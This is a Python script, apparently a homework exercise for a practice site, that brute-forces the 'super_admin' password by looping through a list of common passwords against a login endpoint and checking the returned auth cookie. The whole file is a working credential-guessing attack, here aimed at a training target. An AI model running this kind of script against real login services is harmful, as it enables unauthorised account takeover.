import requests


PASSWORD_URL = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
COOKIE_URL = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
LOGIN = "super_admin"
PASSWORDS = ['!@#$%^&*', '000000', '111111', '121212', '123123', '1234', '12345', '123456', '1234567', '12345678', '123456789', '1234567890', '123qwe', '1q2w3e4r', '1qaz2wsx', '555555', '654321', '666666', '696969', '7777777', '888888', 'aa123456', 'abc123', 'access', 'admin', 'adobe123', 'ashley', 'azerty', 'bailey', 'baseball', 'batman', 'charlie', 'donald', 'dragon', 'flower', 'football', 'freedom', 'hello', 'hottie', 'iloveyou', 'jesus', 'letmein', 'login', 'lovely', 'loveme', 'master', 'michael', 'monkey', 'mustang', 'ninja', 'passw0rd', 'password', 'password1', 'photoshop', 'princess', 'qazwsx', 'qwerty', 'qwerty123', 'qwertyuiop', 'shadow', 'solo', 'starwars', 'sunshine', 'superman', 'trustno1', 'welcome', 'whatever', 'zaq1zaq1']

i = 0
while i < len(PASSWORDS):
    payload = {"login": LOGIN, "password": PASSWORDS[i]}
    response1 = requests.post(PASSWORD_URL, data=payload)
    cookie_value = response1.cookies.get("auth_cookie")
    response2 = requests.post(COOKIE_URL, cookies={"auth_cookie": cookie_value})
    if response2.text == "You are NOT authorized":
        i += 1
    else:
        print(response1.json()["password"])
        print(response2.text)
        break
